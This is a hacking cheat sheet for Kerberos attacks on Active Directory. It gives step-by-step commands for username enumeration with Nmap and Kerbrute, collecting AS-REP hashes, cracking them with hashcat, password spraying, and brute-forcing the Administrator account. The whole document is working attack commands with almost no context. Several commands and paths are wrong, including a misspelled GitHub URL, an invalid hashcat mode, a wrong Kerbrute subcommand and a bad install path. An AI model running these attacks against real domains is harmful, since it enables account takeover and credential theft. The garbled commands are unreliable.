Kerberos username enumeration is useful in Active Directory enviornments where kerberos authentication is used. Valid usernames can often be detected without authentication by interacting with kerberos protocol. This document outlines two powerful methods for kerberos user enumeration using Nmap and Kerbrute.

---

### Krb5-Enum-Users with Nmap

the ``krb5-enum-users`` NSE script performs username enumeration against a Kereros service by analyzing the responses to AS-REQ messages

#### Basic Scan Using Built-in NSE Script

```bash
nmap -v -sT -sV --script=krb5-enum-users.nse -p 88 10.10.10.161
```

#### Scan with Custom Username List

```bash
nmap -v -sT -sV -p 88 --script=krb5-enum-users.nse --script-args krb5.enum-users.realm='htb.local',userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt 10.10.10.161
```

---

## Kerbrute

Kerbrute is a powerful and fast kerberos bruteforcer, written in Go. it supports username enumeration, password spraying and credential brute forcing

Github Repository : https://gtihub.com/ropmop/kerbrute

### Installation Steps

#### Clone The Repo

```bash
git clone https://github.com/ropnop/kerbrute.git
```

#### Change Directory into the project 

```bash
cd kerbrute
```

#### Build the Project 

```bash
make all
```

#### Install Kerbrute Globally


```bash
go install
```

#### Verify the installation path

```bash
which kerbrute
```

#### Copy Binary to Global Path

```bash
cp -v /root/go/bin/kerbrute /user/local/bin/
```

#### Display Help Menu


```bash
kerbrute -h
```




### User Enumeration with kerbrute

#### Basic Enumeration

```bash
kerbrute userenum --dc <IP> -d infosecwarrior.local -o kerbrute.log username.txt
```

* **use ``-v`` for verbose output**

#### Save AS-REP Hashes (for crackable Accounts Without PreAuth)

```bash
kerbrute username --dc <IP> -d infosecwarrior.local -o kerbrute.log username.txt --hash-file AS-REP-hash.txt
```


### Cracking AS-REP Hashes with hashcat

#### Identify Kerberos Hash Modes

```bash
hashcat -h | grep kerberos
```

#### crach AS-REP hashes using rockyou wordlist

```bash
hashcat -a 0 -m 186200 AS-REP-hash.txt /opt/rockyou.txt
```

### Password Spraying with kerbrute 

#### Spray with known password

```bash
kerbrute passwordspray --dc <IP> -d infosecwarrior.local -o kerbrute.log username.txt Password123
```

### Password Bruteforce against a specific user

```bash
kerbrute bruteuser --dc <IP> -d infosecwarrior.local -o kerbrute.log passwords.txt Administrator
```

### BruteForce Username and Password Combos

```bash
kerbrute bruteforce --dc <IP> -d infosecwarrior.local -o kerbrute.log /usr/share/seclists/Passwords/Default-Credentials/windows-bwttwedefaultpasslist.txt
```